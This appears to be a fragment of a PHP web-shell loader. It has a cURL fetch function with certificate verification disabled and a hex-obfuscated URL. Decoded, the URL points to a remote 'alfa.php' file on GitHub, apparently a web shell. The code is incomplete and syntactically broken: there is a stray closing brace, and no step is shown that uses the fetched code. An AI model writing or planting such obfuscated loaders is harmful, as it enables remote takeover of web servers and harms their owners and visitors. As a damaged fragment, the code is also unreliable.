<?php
function getURL($url) {
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6561676c65733232372f636c61756469612f6d61696e2f616c66612e706870';

}
?>
